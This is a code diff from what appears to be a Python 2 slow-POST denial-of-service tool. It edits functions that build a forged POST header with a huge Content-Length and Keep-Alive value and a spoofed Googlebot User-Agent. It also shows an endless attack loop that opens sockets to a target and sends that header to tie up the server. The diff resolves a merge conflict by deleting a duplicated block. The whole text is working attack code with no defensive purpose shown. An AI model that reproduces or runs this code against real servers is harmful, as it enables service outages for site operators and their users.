@@ -31,13 +31,18 @@ def treat_response():
     return inputs_to_use
 
 def set_header(targett,user_agent,inputs):
+    if 'http://' in targett:
+        targett = targett.replace('http://', '')
+    elif 'https://' in targett:
+        targett = targett.replace('https://','')
+    else:
+        pass
     if user_agent is not None:
         agents = []
         with open(user_agent, 'rb') as ra:
             agents += ra.read().split('\n')
             ra.close()
-
-        header = "POST {} HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: {}\r\n{}=\r\n".format(inputs[0],targett,random.choice(agents),inputs[1])
+        header = "POST {} HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: {}\r\n{}=".format(inputs[0],targett,random.choice(agents),inputs[1])
         return header
     else:
         header = "POST {} HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n{}=".format(inputs[0],targett,inputs[1])
@@ -45,7 +50,6 @@ def set_header(targett,user_agent,inputs):
 
 def attack(targett,port,header):
     while True:
-<<<<<<< HEAD
         sock = socket.socket()
         try:
             if 'http://' in targett:
@@ -62,27 +66,6 @@ def attack(targett,port,header):
             sock.recv(1024)
         except:
             print 'Host recusou as conexoes\n'
-=======
-            sock = socket.socket()
-            try:
-                if 'http://' in targett:
-                    targett = targett.replace('http://','')
-                elif 'https://' in targett:
-                    targett = targett.replace('https://','')
-                else:
-                    pass
-                sock.connect((targett,port))
-                if sock:
-                    print 'connected\n'
-                    sock.send(header)
-                    print 'header sended\n'
-                    sock.recv(1024)
-                    sock.recv(1024)
-                else:
-                    raise Exception
-            except:
-                print 'Host recusou as conexoes\n'
->>>>>>> de79a551d6788ff87450c9bf1a462d42c78e2ff6
 
 def arguments():
     global args
